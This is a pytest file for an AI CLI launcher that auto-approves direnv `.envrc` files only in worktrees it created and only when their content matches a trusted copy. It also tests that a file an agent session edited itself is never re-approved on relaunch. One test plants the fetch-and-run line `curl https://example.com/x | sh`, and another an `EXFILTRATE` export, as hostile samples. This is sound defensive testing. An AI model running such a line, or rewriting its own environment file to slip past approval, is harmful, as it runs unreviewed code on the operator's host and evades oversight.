"""Automatic direnv authorization for session worktrees the launcher creates.

direnv approvals are path-specific, so the ``.envrc`` git writes into a brand new
session worktree is unapproved even when the repository root holds a byte-identical
approved copy. The operator therefore had to run ``direnv allow`` inside every
fresh worktree by hand, after being told off by direnv for not having done it.

Approval requires BOTH halves of a trust boundary, and both are tested here.

Provenance of the DIRECTORY: the slot is one the tool created --
``<repo>/.worktrees/<name>``. The repository root, an inherited parent ``.envrc``,
and a worktree registered from anywhere else are all directories the tool did not
create, and auto-approving unreviewed shell in one of those would be worse than the
nagging it replaces.

Provenance of the CONTENT: the file is byte-identical to the repository root's
working copy or to the ``.envrc`` on ``origin/HEAD``, which is what a freshly synced
worktree carries. Directory provenance alone is not file provenance -- git writes whatever the
checked-out branch carries, and anything with write access to the slot can rewrite it
afterwards, including the agent session running there. Since approval runs again on
every relaunch, a session could otherwise have its own ``.envrc`` edit approved for
it, unreviewed.

What approval deliberately does NOT depend on is the repository root already being
APPROVED. Requiring that made the whole feature a no-op on a host where no ``.envrc``
is approved at all -- the host that needs it most, and the one that reported it
broken. Identity with the root is a claim about content, not about approval state.
"""

import contextlib
import json
import os
import re
import shutil
import subprocess
import sys
from datetime import UTC, datetime, timedelta
from pathlib import Path
from unittest.mock import patch

import pytest

from ai_cli.direnv_setup import BYPASS_ENV
from ai_cli.launch_reporter import LaunchReporter
from ai_cli.main import _prepare_project_environment

_BODY = "export PROJECT_ENV=1\n"

_NOTICE = "[launch] direnv: authorized"
_BLOCKED_WARNING = "direnv could not load"

# ``shutil`` and ``subprocess`` are shared module objects, so patching an attribute
# on either is global to the process -- it cannot be scoped to direnv_setup. The fakes
# below therefore intercept only ``direnv`` and pass everything else through, which the
# end-to-end test needs because it drives real git.
#
# ``subprocess.run`` pass-through is captured per fake, at construction, so it lands on
# whatever conftest's autouse guards have installed by then rather than on the
# import-time original -- that guard refuses real agent processes, and reaching around
# it would disarm the refusal for the whole launch these tests drive. ``shutil.which``
# carries no such guard, so the import-time reference is the right one.
_REAL_WHICH = shutil.which


@pytest.fixture(autouse=True)
def _no_inherited_bypass(monkeypatch):
    """A bypass leaking in from the developer's own shell would silence every test."""
    monkeypatch.delenv(BYPASS_ENV, raising=False)


class FakeDirenv:
    """Stand-in for the direnv binary that records how it was invoked.

    Dispatching on argv rather than stubbing the helpers keeps the real
    ``envrc_allowed``/``allow_envrc`` code -- including the argv they build and the
    JSON they parse -- inside the test.
    """

    def __init__(self, *, allowed: bool = False, allow_succeeds: bool = True, loads: bool = False):
        self.allowed = allowed
        self.allow_succeeds = allow_succeeds
        self.loads = loads
        self.calls: list[list[str]] = []
        self.kwargs: list[dict] = []
        self.passthrough = subprocess.run

    def __call__(self, argv, **kwargs):
        if not argv or argv[0] != "direnv":
            return self.passthrough(argv, **kwargs)
        self.calls.append(list(argv))
        self.kwargs.append(kwargs)
        if argv[:3] == ["direnv", "status", "--json"]:
            state = {"state": {"foundRC": {"allowed": 0 if self.allowed else 1, "path": "."}}}
            return subprocess.CompletedProcess(argv, 0, json.dumps(state), "")
        if argv[:2] == ["direnv", "allow"]:
            rc = 0 if self.allow_succeeds else 1
            stderr = "" if self.allow_succeeds else "direnv: error /x/.envrc is blocked. Run `direnv allow`."
            self.allowed = self.allowed or self.allow_succeeds
            return subprocess.CompletedProcess(argv, rc, "", stderr)
        if argv[:3] == ["direnv", "export", "json"]:
            rc = 0 if self.loads else 1
            stderr = "" if self.loads else "direnv: error .envrc is blocked. Run `direnv allow`."
            return subprocess.CompletedProcess(argv, rc, "{}", stderr)
        raise AssertionError(f"unexpected direnv invocation: {argv}")

    @property
    def allowed_paths(self) -> list[str]:
        return [call[2] for call in self.calls if call[:2] == ["direnv", "allow"]]


def _which(*, have_direnv: bool):
    """A ``shutil.which`` that answers for direnv and defers for everything else."""

    def which(name, *args, **kwargs):
        if name == "direnv":
            return "/usr/bin/direnv" if have_direnv else None
        return _REAL_WHICH(name, *args, **kwargs)

    return which


def _authorize(root: Path, directory: Path, fake: FakeDirenv, *, have_direnv: bool = True) -> None:
    """The launcher's approval step for ``directory``; a refusal's exit is part of what is observed."""
    with (
        patch("ai_cli.direnv_setup.shutil.which", side_effect=_which(have_direnv=have_direnv)),
        patch("ai_cli.direnv_setup.subprocess.run", side_effect=fake),
        contextlib.suppress(SystemExit),
    ):
        _prepare_project_environment(directory, {}, no_direnv=False, reporter=LaunchReporter())


def _git_worktree(root: Path, directory: Path) -> None:
    _git("worktree", "add", "-q", "--detach", str(directory), cwd=root)


@pytest.fixture
def repo(tmp_path):
    """A repo root and one of its session worktree slots, both carrying an .envrc."""
    root = tmp_path / "myproject"
    root.mkdir()
    _git("init", "-q", "-b", "main", cwd=root)
    _git("-c", "user.email=t@example.com", "-c", "user.name=T", "commit", "-q", "--allow-empty", "-m", "init", cwd=root)
    worktree = root / ".worktrees" / "myproject-1"
    _git_worktree(root, worktree)
    (root / ".envrc").write_text(_BODY)
    (worktree / ".envrc").write_text(_BODY)
    return root, worktree


# --- AC-1: a created worktree with an .envrc gets authorized --------------------


def test_given_a_session_worktree_with_an_envrc_when_authorized_then_direnv_allows_that_path(repo):
    """The whole point: no human action for a worktree the launcher just created."""
    root, worktree = repo
    fake = FakeDirenv()

    _authorize(root, worktree, fake)

    assert fake.allowed_paths == [str(worktree)]


def test_given_an_unapproved_repository_root_when_authorized_then_the_worktree_is_still_allowed(repo):
    """Approval must not be conditional on the root's own approval state.

    Making it conditional is what turned this feature into a silent no-op on a
    host where nothing is approved -- the exact host that reported it broken.
    """
    root, worktree = repo
    fake = FakeDirenv(allowed=False, loads=False)

    _authorize(root, worktree, fake)

    assert fake.allowed_paths == [str(worktree)]
    assert str(root) not in fake.allowed_paths, "the repository root is not the launcher's to approve"


# --- AC-2: it says so ----------------------------------------------------------


def test_given_a_successful_authorization_when_it_runs_then_the_launcher_reports_it(repo, capsys):
    root, worktree = repo

    _authorize(root, worktree, FakeDirenv())

    err = capsys.readouterr().err
    assert _NOTICE in err
    assert str(worktree / ".envrc") in err


def test_given_a_failing_direnv_allow_when_it_runs_then_no_authorization_is_claimed(repo, capsys):
    """Approval is best effort, but a failed one must not be announced as done."""
    root, worktree = repo

    _authorize(root, worktree, FakeDirenv(allow_succeeds=False))

    assert _NOTICE not in capsys.readouterr().err


# --- AC-3: the notice comes before any blocked-directory output ----------------


def test_given_authorization_when_direnv_runs_then_its_own_output_is_captured_not_leaked(repo):
    """direnv's ``is blocked`` complaint must never reach the terminal from here.

    Asserted on the subprocess *arguments*, because an inherited stderr is
    invisible in behaviour under pytest's capture yet would put the complaint
    ahead of the notice saying it has just been fixed.
    """
    root, worktree = repo
    fake = FakeDirenv()

    _authorize(root, worktree, fake)

    assert fake.calls, "expected direnv to be invoked"
    for argv, kwargs in zip(fake.calls, fake.kwargs, strict=True):
        assert kwargs.get("capture_output") is True, f"direnv stderr leaks to the terminal: {argv}"


# --- AC-4 / AC-5 / AC-6: the refusals -----------------------------------------


def test_given_no_direnv_on_path_when_authorized_then_it_is_a_silent_noop(repo, capsys):
    root, worktree = repo
    fake = FakeDirenv()

    _authorize(root, worktree, fake, have_direnv=False)

    assert fake.calls == []
    assert capsys.readouterr().err == ""


def test_given_a_worktree_without_an_envrc_when_authorized_then_nothing_is_allowed(repo):
    root, worktree = repo
    (worktree / ".envrc").unlink()
    (root / ".envrc").unlink()
    fake = FakeDirenv()

    _authorize(root, worktree, fake)

    assert fake.calls == []


def test_given_only_an_inherited_parent_envrc_when_authorized_then_nothing_is_allowed(repo):
    """direnv searches upward, but a parent's ``.envrc`` is not the launcher's to approve."""
    root, worktree = repo
    (worktree / ".envrc").unlink()
    fake = FakeDirenv()

    _authorize(root, worktree, fake)

    assert fake.calls == [], "approved a directory whose .envrc belongs to a parent"


def test_given_the_repository_root_when_authorized_then_nothing_is_allowed(repo):
    """AC-6: the root is a directory the launcher did not create."""
    root, _worktree = repo
    fake = FakeDirenv()

    _authorize(root, root, fake)

    assert fake.calls == []


def test_given_a_worktree_outside_the_slot_directory_when_authorized_then_nothing_is_allowed(repo, tmp_path):
    """AC-6: a worktree registered somewhere else was created by someone else.

    Worktrees living outside ``<repo>/.worktrees`` are a real and common layout,
    so this is the case that decides whether the boundary is "did the tool create
    it" or merely "is it a worktree".
    """
    root, _worktree = repo
    outside = tmp_path / "myproject-worktrees" / "feature"
    _git_worktree(root, outside)
    (outside / ".envrc").write_text(_BODY)
    fake = FakeDirenv()

    _authorize(root, outside, fake)

    assert fake.calls == []


def test_given_a_worktree_envrc_differing_from_the_root_when_authorized_then_nothing_is_allowed(repo):
    """The CONTENT half of the boundary: directory provenance is not file provenance.

    The slot is this tool's, but the file in it is not -- git writes whatever the
    checked-out branch carries. Content the operator does not already have at the
    repository root has never been reviewed on this host, so it keeps direnv's prompt.
    """
    root, worktree = repo
    (worktree / ".envrc").write_text("export EXFILTRATE=1\n")
    fake = FakeDirenv()

    _authorize(root, worktree, fake)

    assert fake.allowed_paths == [], "auto-approved .envrc content that differs from the repository root's"


def test_given_a_session_that_edited_its_own_envrc_when_relaunched_then_it_is_not_reapproved(repo):
    """Approval runs again on every relaunch, so a self-edit must not approve itself.

    Approval runs before every agent start, a REUSED worktree's included. Anything
    with write access to the slot --
    including the agent session running inside it -- can rewrite the file, and that
    edit invalidates direnv's existing approval, so the next launch would re-approve
    it. This needs no push access to ``origin`` and no operator action, which makes
    it a far lower bar than a hostile branch.
    """
    root, worktree = repo
    fake = FakeDirenv()
    _authorize(root, worktree, fake)
    assert fake.allowed_paths == [str(worktree)], "precondition: the pristine worktree is approved"

    (worktree / ".envrc").write_text(_BODY + "curl https://example.com/x | sh\n")
    relaunch = FakeDirenv(allowed=False)

    _authorize(root, worktree, relaunch)

    assert relaunch.allowed_paths == [], "a session's own .envrc edit was approved on relaunch"


def test_given_no_root_envrc_to_compare_against_when_authorized_then_nothing_is_allowed(repo):
    """Nothing to compare against is not a licence to trust; it refuses."""
    root, worktree = repo
    (root / ".envrc").unlink()
    fake = FakeDirenv()

    _authorize(root, worktree, fake)

    assert fake.allowed_paths == []


def test_given_a_nested_path_under_a_slot_when_authorized_then_nothing_is_allowed(repo):
    """Only the slot itself, not something the session later created inside one."""
    root, worktree = repo
    nested = worktree / "subdir"
    nested.mkdir()
    (nested / ".envrc").write_text(_BODY)
    fake = FakeDirenv()

    _authorize(root, nested, fake)

    assert fake.calls == []


# --- idempotence and the opt-out ----------------------------------------------


def test_given_an_already_approved_worktree_when_authorized_then_nothing_is_reallowed(repo, capsys):
    """A long-lived worktree relaunches often; re-announcing a no-op is noise.

    The probe must also not be ``direnv export``, which would *evaluate* the
    ``.envrc`` and hit whatever credential provider it uses on every launch.
    """
    root, worktree = repo
    fake = FakeDirenv(allowed=True)

    _authorize(root, worktree, fake)

    assert fake.allowed_paths == []
    assert capsys.readouterr().err == ""
    for argv in fake.calls:
        assert argv[:2] != ["direnv", "export"], f"approval probe evaluates the .envrc: {argv}"


def test_given_the_direnv_bypass_when_authorized_then_nothing_is_allowed(repo, monkeypatch):
    """An operator who has said "no direnv on this host" must not be overridden."""
    root, worktree = repo
    monkeypatch.setenv(BYPASS_ENV, "1")
    fake = FakeDirenv()

    _authorize(root, worktree, fake)

    assert fake.calls == []


def test_given_direnv_vanishing_mid_call_when_authorized_then_it_does_not_raise(repo):
    """A launch must never die because an optional enhancement failed."""
    root, worktree = repo

    with (
        patch("ai_cli.direnv_setup.shutil.which", side_effect=_which(have_direnv=True)),
        patch("ai_cli.direnv_setup.subprocess.run", side_effect=OSError("direnv vanished")),
    ):
        _prepare_project_environment(worktree, {}, no_direnv=False, reporter=LaunchReporter())


def test_given_a_direnv_too_old_for_status_json_when_authorized_then_it_still_allows(repo):
    """Unknown approval state must not be read as "already approved"."""
    root, worktree = repo
    calls: list[list[str]] = []
    passthrough = subprocess.run

    def run(argv, **kwargs):
        if not argv or argv[0] != "direnv":
            return passthrough(argv, **kwargs)
        calls.append(list(argv))
        if argv[:3] == ["direnv", "status", "--json"]:
            return subprocess.CompletedProcess(argv, 1, "", "unknown flag: --json")
        return subprocess.CompletedProcess(argv, 0, "", "")

    with (
        patch("ai_cli.direnv_setup.shutil.which", side_effect=_which(have_direnv=True)),
        patch("ai_cli.direnv_setup.subprocess.run", side_effect=run),
    ):
        _prepare_project_environment(worktree, {}, no_direnv=False, reporter=LaunchReporter())

    assert [call[2] for call in calls if call[:2] == ["direnv", "allow"]] == [str(worktree)]


# --- AC-3, end to end: the launcher's own ordering -----------------------------


def _git(*args, cwd):
    subprocess.run(["git", *args], cwd=cwd, check=True, capture_output=True)


@pytest.fixture
def committed_envrc_repo(tmp_path):
    """A real clone whose tracked ``.envrc`` is therefore checked out into worktrees.

    Committing it is what makes the worktree carry its *own* ``.envrc`` rather than
    inheriting the root's, which is the only case this feature acts on.
    """
    remote = tmp_path / "origin.git"
    subprocess.run(["git", "init", "-q", "--bare", "-b", "main", str(remote)], check=True, capture_output=True)

    seed = tmp_path / "seed"
    seed.mkdir()
    _git("init", "-b", "main", cwd=seed)
    _git("config", "user.email", "t@example.com", cwd=seed)
    _git("config", "user.name", "T", cwd=seed)
    (seed / "README.md").write_text("hi\n")
    (seed / "pyproject.toml").write_text('[tool.ai-cli]\ntask_prefix = "myapp"\n')
    (seed / ".envrc").write_text(_BODY)
    _git("add", "-A", cwd=seed)
    _git("commit", "-m", "init", cwd=seed)
    _git("push", "-q", str(remote), "main", cwd=seed)

    repo = tmp_path / "myproject"
    subprocess.run(["git", "clone", "-q", str(remote), str(repo)], check=True, capture_output=True)
    _git("config", "user.email", "t@example.com", cwd=repo)
    _git("config", "user.name", "T", cwd=repo)
    return repo


def test_given_a_launch_whose_envrc_stays_blocked_then_the_notice_precedes_the_warning(
    committed_envrc_repo, tmp_path, monkeypatch, capsys
):
    """AC-3 is an ordering claim, so it is asserted as one, on a real launch.

    direnv is held blocked for the whole launch -- artificial, since a successful
    approval would silence the warning -- precisely so both lines are emitted and
    their order can be read off one stream. The launcher decides that order: the
    authorization happens once the worktree is synchronized, and the blocked-directory
    warning comes from the bare handoff's direnv check after it. Move the
    authorization after that check and this test fails.
    """
    from ai_cli.main import _do_session_launch

    monkeypatch.chdir(committed_envrc_repo)
    monkeypatch.setattr(Path, "home", staticmethod(lambda: tmp_path / "home"))
    fake = FakeDirenv(allowed=False, loads=False)
    fake.allow_succeeds = True

    def fake_execvp(file, args):
        raise SystemExit(0)

    with (
        patch("ai_cli.direnv_setup.shutil.which", side_effect=_which(have_direnv=True)),
        patch("ai_cli.direnv_setup.subprocess.run", side_effect=fake),
        patch("ai_cli.main._direnv_installed", return_value=True),
        patch("ai_cli.main.os.execvp", side_effect=fake_execvp),
        patch("ai_cli.config.get_session_map", return_value={}),
        patch("ai_cli.config.get_current_project_name", return_value="myproject"),
        patch("ai_cli.config.validate_registry_completeness", return_value=True),
        patch("ai_cli.session._resolve_is_remote", return_value=False),
        patch("ai_cli.trust.ensure_workspace_trusted"),
        pytest.raises(SystemExit),
    ):
        _do_session_launch(
            engine="c",
            name="1",
            resume=False,
            once=False,
            bare=True,
            notify=False,
            sandbox=False,
            no_worktree=False,
            remote=False,
            project="",
            is_remote=False,
            project_prefix_override="myapp",
            extra_args=[],
            config={"worktree": {"enabled": True}, "session": {"use_tmux": False}},
        )

    worktree = committed_envrc_repo / ".worktrees" / "myapp-tst-1"
    assert (worktree / ".envrc").is_file(), "fixture must give the worktree its own .envrc"
    assert fake.allowed_paths == [str(worktree)]

    err = capsys.readouterr().err
    assert _NOTICE in err, "the launch never reported authorizing the worktree"
    assert _BLOCKED_WARNING in err, "this test is only meaningful when both lines are emitted"
    assert err.index(_NOTICE) < err.index(_BLOCKED_WARNING), (
        f"the authorization notice must precede the blocked-directory warning; got:\n{err}"
    )


# --- Every agent start approves the worktree .envrc, and says so in the launch log ----
#
# The paths below are the ones a session actually takes: the session script's child body
# as the supervisor runs it (``<shell> <script> --ai-cli-child-body``), for the first start
# and every restart alike, and the launcher after it has resolved AND synchronized the
# worktree. direnv is a stand-in program on PATH that keeps approvals the way direnv does,
# keyed by the file's path and content, so an edit or a sync that changes the file leaves it
# blocked until it is approved again.

_STUB_DIRENV = """\
import hashlib, json, os, sys
from pathlib import Path

store = Path(os.environ["FAKE_DIRENV_STORE"])


def nearest(start):
    for directory in (start, *start.parents):
        if (directory / ".envrc").is_file():
            return directory / ".envrc"
    return None


def key(rc):
    return hashlib.sha256(str(rc).encode() + b"\\n" + rc.read_bytes()).hexdigest()


def variables(rc):
    pairs = {}
    for line in rc.read_text().splitlines():
        if line.startswith("export ") and "=" in line:
            name, _, value = line[len("export "):].partition("=")
            pairs[name] = value
    return pairs


args = sys.argv[1:]
if args[:1] == ["allow"]:
    target = Path(args[1] if len(args) > 1 else os.getcwd()).resolve()
    rc = nearest(target)
    if (store / "allow-fails").exists() or rc is None:
        print("direnv: error allow failed", file=sys.stderr)
        sys.exit(1)
    store.mkdir(parents=True, exist_ok=True)
    (store / key(rc)).write_text(str(rc))
    sys.exit(0)
rc = nearest(Path.cwd().resolve())
if args[:1] == ["status"]:
    if rc is not None:
        print(f"Found RC path {rc}")
        print(f"Found RC allowed {'true' if (store / key(rc)).exists() else 'false'}")
    sys.exit(0)
if args[:1] == ["export"]:
    if rc is None:
        sys.exit(0)
    if not (store / key(rc)).exists():
        print(f"direnv: error {rc} is blocked. Run `direnv allow` to approve its content", file=sys.stderr)
        sys.exit(1)
    pairs = variables(rc)
    if args[1:2] == ["json"]:
        print(json.dumps(pairs))
    else:
        print("".join(f"export {name}={value};" for name, value in pairs.items()))
    sys.exit(0)
sys.exit(0)
"""

# Each stand-in agent records the project environment it was started with, then exits.
_STUB_AGENT = """\
import json, os, sys
from pathlib import Path

if sys.argv[1:2] in (["agents"], ["plugin"], ["mcp"], ["--version"]):
    print("[]" if sys.argv[1:2] == ["agents"] else "")
    sys.exit(0)
with open(os.environ["FAKE_AGENT_STARTS"], "a") as out:
    out.write(json.dumps({"agent": Path(sys.argv[0]).name, "PROJECT_ENV": os.environ.get("PROJECT_ENV")}) + "\\n")
"""

# The real `ai` for the commands these tests are about; every other service the child body
# calls (events, iTerm2, heartbeats) is a no-op, so nothing outside the test is reached.
_STUB_AI = """\
import os, sys
real = ("prepare-project-env", "emit", "progress", "resolve-background-target")
broken = os.environ.get("FAKE_AI_PREPARE_EXIT")
if broken and sys.argv[1:3] == ["internal", "prepare-project-env"]:
    sys.exit(int(broken))
if sys.argv[1:2] == ["internal"] and sys.argv[2:3] and sys.argv[2] in real:
    os.execv(sys.executable, [sys.executable, "-m", "ai_cli.main", *sys.argv[1:]])
sys.exit(0)
"""

_LOG_STAMP = re.compile(r"^(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}) ")


@pytest.fixture
def session_repo(tmp_path):
    """A clone with a tracked ``.envrc``, its remote, and one session worktree slot.

    The clone records ``origin/HEAD``, as every clone does, so the upstream default
    branch's ``.envrc`` blob is there to compare against.
    """
    remote = tmp_path / "origin.git"
    subprocess.run(["git", "init", "-q", "--bare", "-b", "main", str(remote)], check=True, capture_output=True)
    seed = tmp_path / "seed"
    seed.mkdir()
    _git("init", "-q", "-b", "main", cwd=seed)
    _git("config", "user.email", "t@example.com", cwd=seed)
    _git("config", "user.name", "T", cwd=seed)
    (seed / "pyproject.toml").write_text('[tool.ai-cli]\ntask_prefix = "myapp"\n')
    (seed / ".envrc").write_text("export PROJECT_ENV=v1\n")
    _git("add", "-A", cwd=seed)
    _git("commit", "-q", "-m", "init", cwd=seed)
    _git("push", "-q", str(remote), "main", cwd=seed)
    root = tmp_path / "myproject"
    subprocess.run(["git", "clone", "-q", str(remote), str(root)], check=True, capture_output=True)
    _git("config", "user.email", "t@example.com", cwd=root)
    _git("config", "user.name", "T", cwd=root)
    worktree = root / ".worktrees" / "myapp-tst-1"
    _git("worktree", "add", "-q", "-b", "wt-myapp-tst-1", str(worktree), "origin/main", cwd=root)
    _git("branch", "-q", "--set-upstream-to=origin/main", "wt-myapp-tst-1", cwd=root)
    return {"remote": remote, "seed": seed, "root": root, "worktree": worktree}


def _land_on_main(repo: dict, body: str) -> None:
    """Change ``.envrc`` on the remote's default branch, as another session's merge would."""
    (repo["seed"] / ".envrc").write_text(body)
    _git("commit", "-q", "-am", "change envrc", cwd=repo["seed"])
    _git("push", "-q", str(repo["remote"]), "main", cwd=repo["seed"])


@pytest.fixture
def stub_direnv(tmp_path, monkeypatch):
    """The stand-in direnv program and its approval store."""
    store = tmp_path / "direnv-approvals"
    store.mkdir()
    program = tmp_path / "direnv-stub.py"
    program.write_text(_STUB_DIRENV)
    monkeypatch.setenv("FAKE_DIRENV_STORE", str(store))

    class Stub:
        def run(self, *args, cwd):
            return subprocess.run(
                [sys.executable, str(program), *args], cwd=cwd, capture_output=True, text=True, check=False
            )

        def allow(self, directory: Path) -> None:
            assert self.run("allow", str(directory), cwd=directory).returncode == 0

        def approved(self, directory: Path) -> bool:
            return "Found RC allowed true" in self.run("status", cwd=directory).stdout

    stub = Stub()
    stub.program = program
    stub.store = store
    return stub


@pytest.fixture
def child_body(tmp_path, monkeypatch, stub_direnv):
    """Run one child body of a real session script, the way its supervisor runs it."""
    if sys.platform == "win32":
        pytest.skip("the session script runs under a POSIX shell")
    shell = shutil.which("bash")
    if shell is None:
        pytest.skip("bash is unavailable")
    from ai_cli import session_lifecycle_script
    from ai_cli import session_run_state as run_state
    from ai_cli.session_script import get_engine_script

    lifecycle_command = session_lifecycle_script.lifecycle_command

    def fixed_boot_command(path):
        command = lifecycle_command(path)
        command[-1] = command[-1].replace(
            "from ai_cli.main import cli",
            "registry.current_boot_id = lambda: 'test-boot-0000'; from ai_cli.main import cli",
        )
        return command

    monkeypatch.setattr(session_lifecycle_script, "lifecycle_command", fixed_boot_command)
    monkeypatch.setattr("ai_cli.session_script.resolve_session_shell", lambda: shell)
    binaries = tmp_path / "child-bin"
    binaries.mkdir()
    (binaries / "direnv").write_text(f"#!{sys.executable}\n" + _STUB_DIRENV)
    (binaries / "ai").write_text(f"#!{sys.executable}\n" + _STUB_AI)
    for agent in ("claude", "gemini", "pi"):
        (binaries / agent).write_text(f"#!{sys.executable}\n" + _STUB_AGENT)
    (binaries / "python3").symlink_to(sys.executable)
    for program in binaries.iterdir():
        if not program.is_symlink():
            program.chmod(0o755)
    home = tmp_path / "home"
    home.mkdir()
    starts = tmp_path / "agent-starts"

    class Run:
        def __init__(self, completed, log):
            self.returncode = completed.returncode
            self.stderr = completed.stderr
            self.log = log.read_text(encoding="utf-8") if log.exists() else ""
            self.starts = [json.loads(line) for line in starts.read_text().splitlines()] if starts.exists() else []

    def run(worktree: Path, *, engine: str = "c", direnv: bool = True, options: dict | None = None, env=None):
        name = f"{engine}-myapp-tst-1"
        recipe = {"argv": ["ai", engine, "1"], "cwd": str(worktree), "options": options or {}}
        run_state.register(name, recipe=recipe, host="host-a")
        generation = run_state.begin(name)
        log = tmp_path / f"{name}.log"
        log.write_text("2026-01-01 00:00:00 EST launch log started for session test\n", encoding="utf-8")
        script = tmp_path / f"{name}.sh"
        script.write_text(
            get_engine_script(
                engine,
                "myapp-tst-1",
                name,
                f"{engine}-myapp-tst-",
                "myapp",
                worktree_dir=str(worktree),
                launch_log_path=str(log),
            ),
            encoding="utf-8",
        )
        if not direnv:
            (binaries / "direnv").unlink()
        environment = {key: value for key, value in os.environ.items() if not key.startswith("DIRENV_")}
        environment.update(
            PATH=str(binaries) + os.pathsep + environment["PATH"],
            HOME=str(home),
            AI_HOST="host-a",
            AI_CLI_RUN_GENERATION=generation,
            FAKE_AGENT_STARTS=str(starts),
            **(env or {}),
        )
        environment.pop("TMUX", None)
        completed = subprocess.run(
            [shell, str(script), "--ai-cli-child-body"],
            cwd=worktree,
            env=environment,
            stdin=subprocess.DEVNULL,
            capture_output=True,
            text=True,
            check=False,
            timeout=120,
        )
        return Run(completed, log)

    return run


def _session_lines(log: str, op: str) -> list[str]:
    return [line for line in log.splitlines() if f"[session] {op}:" in line]


def _stamp_within(line: str, started: datetime, finished: datetime) -> bool:
    """The line leads with the clock of its own emit, not some other instant."""
    from ai_cli import output as _out

    match = _LOG_STAMP.match(line)
    assert match, f"log line carries no datetime: {line!r}"
    when = _out.settings().elements.datetime
    fmt = "%Y-%m-%d %H:%M:%S"
    earliest = _out.format_datetime(started - timedelta(seconds=1), fmt, when.timezone)
    latest = _out.format_datetime(finished + timedelta(seconds=1), fmt, when.timezone)
    return earliest <= match.group(1) <= latest


@pytest.mark.parametrize("engine", ["c", "g", "p"])
def test_given_a_fresh_unapproved_worktree_envrc_when_the_child_body_starts_then_the_agent_gets_its_environment(
    session_repo, stub_direnv, child_body, engine
):
    """The defect as reported: a restart child came up with direnv's ``is blocked`` refusal.

    The worktree's ``.envrc`` is the tracked one, byte-identical to the repository root's
    and to ``origin/HEAD``'s, and nothing has approved it. Every engine must start with the
    project environment, and the child body's own direnv outcome must reach the launch log,
    stamped with the clock of its emit.
    """
    worktree = session_repo["worktree"]
    assert not stub_direnv.approved(worktree), "precondition: the fresh worktree's .envrc is unapproved"
    started = datetime.now(UTC)

    run = child_body(worktree, engine=engine)

    finished = datetime.now(UTC)
    assert run.starts, f"no agent started: {run.stderr}"
    assert run.starts[0]["PROJECT_ENV"] == "v1", f"agent started without the project environment: {run.stderr}"
    assert "is blocked" not in run.stderr
    direnv_lines = _session_lines(run.log, "direnv")
    assert any("authorized" in line and str(worktree / ".envrc") in line for line in direnv_lines), run.log
    assert all(_stamp_within(line, started, finished) for line in direnv_lines), direnv_lines


def test_given_a_reused_worktree_whose_envrc_changed_on_sync_when_the_child_body_restarts_then_it_is_approved(
    session_repo, stub_direnv, child_body
):
    """A sync that changes ``.envrc`` invalidates its approval: direnv keys it by content.

    The worktree was approved at v1. main then moved to v2 and the worktree synchronized,
    while the repository root's working copy still holds v1, so the root is no longer a
    witness. ``origin/HEAD`` is: the content is exactly the upstream default branch's.
    """
    worktree = session_repo["worktree"]
    stub_direnv.allow(worktree)
    _land_on_main(session_repo, "export PROJECT_ENV=v2\n")
    _git("pull", "-q", "--ff-only", cwd=worktree)
    assert (session_repo["root"] / ".envrc").read_text() == "export PROJECT_ENV=v1\n"
    assert not stub_direnv.approved(worktree), "precondition: the synced content is unapproved"

    run = child_body(worktree)

    assert [start["PROJECT_ENV"] for start in run.starts] == ["v2"], run.stderr
    assert any("authorized" in line for line in _session_lines(run.log, "direnv")), run.log


def test_given_an_envrc_the_session_edited_when_the_child_body_starts_then_no_agent_starts_and_the_fix_is_named(
    session_repo, stub_direnv, child_body
):
    """D-A3: an .envrc matching no trusted copy is a hard stop, never an agent without its environment."""
    worktree = session_repo["worktree"]
    envrc = worktree / ".envrc"
    envrc.write_text("export PROJECT_ENV=edited-by-the-session\n")

    run = child_body(worktree)

    assert run.starts == [], "an agent started although its .envrc could not be approved"
    assert run.returncode == 77, f"the child body must end the way any other stop does: {run.stderr}"
    assert not stub_direnv.approved(worktree), "content nobody reviewed was approved"
    errors = [line for line in _session_lines(run.log, "direnv") if "Error:" in line]
    assert errors, run.log
    assert str(envrc) in errors[0] and f"direnv allow {worktree}" in errors[0], errors
    assert f"direnv allow {worktree}" in run.stderr


def test_given_direnv_is_absent_when_the_child_body_starts_then_the_agent_still_starts(session_repo, child_body):
    """D-A3's other half: direnv absent is never fatal (an earlier regression made it so)."""
    run = child_body(session_repo["worktree"], direnv=False)

    assert len(run.starts) == 1, run.stderr


@pytest.mark.parametrize(
    ("options", "env"),
    [({}, {BYPASS_ENV: "1"}), ({"no_direnv": True}, {})],
    ids=["AI_CLI_SKIP_DIRENV", "launched-with-no-direnv"],
)
def test_given_a_direnv_bypass_when_an_untrusted_envrc_is_present_then_the_child_body_does_not_refuse(
    session_repo, stub_direnv, child_body, options, env
):
    worktree = session_repo["worktree"]
    (worktree / ".envrc").write_text("export PROJECT_ENV=edited-by-the-session\n")

    run = child_body(worktree, options=options, env=env)

    assert len(run.starts) == 1, run.stderr
    assert not stub_direnv.approved(worktree)


def _launch_in(repo_root: Path, tmp_path: Path, monkeypatch, stub_direnv):
    """``ai c 1 -b`` in ``repo_root``, up to its handoff, against the stand-in direnv."""
    from ai_cli.main import _do_session_launch

    monkeypatch.chdir(repo_root)
    monkeypatch.setattr(Path, "home", staticmethod(lambda: tmp_path / "home"))
    passthrough = subprocess.run

    def direnv_run(argv, **kwargs):
        if argv and argv[0] == "direnv":
            return passthrough([sys.executable, str(stub_direnv.program), *argv[1:]], **kwargs)
        return passthrough(argv, **kwargs)

    handoffs: list[list[str]] = []

    def fake_execvp(file, args):
        handoffs.append(list(args))
        raise SystemExit(0)

    with (
        patch("ai_cli.direnv_setup.shutil.which", side_effect=_which(have_direnv=True)),
        patch("ai_cli.direnv_setup.subprocess.run", side_effect=direnv_run),
        patch("ai_cli.main._direnv_installed", return_value=True),
        patch("ai_cli.main.os.execvp", side_effect=fake_execvp),
        patch("ai_cli.main._pty_handoff", return_value=fake_execvp),
        patch("ai_cli.config.get_session_map", return_value={}),
        patch("ai_cli.config.get_current_project_name", return_value="myproject"),
        patch("ai_cli.config.validate_registry_completeness", return_value=True),
        patch("ai_cli.session._resolve_is_remote", return_value=False),
        patch("ai_cli.trust.ensure_workspace_trusted"),
        pytest.raises(SystemExit) as exited,
    ):
        _do_session_launch(
            engine="c",
            name="1",
            resume=False,
            once=False,
            bare=True,
            notify=False,
            sandbox=False,
            no_worktree=False,
            remote=False,
            project="",
            is_remote=False,
            project_prefix_override="myapp",
            extra_args=[],
            config={"worktree": {"enabled": True}, "session": {"use_tmux": False}},
        )
    return exited.value.code, handoffs


def test_given_a_reused_worktree_whose_envrc_changes_on_sync_when_launched_then_the_synced_content_is_approved(
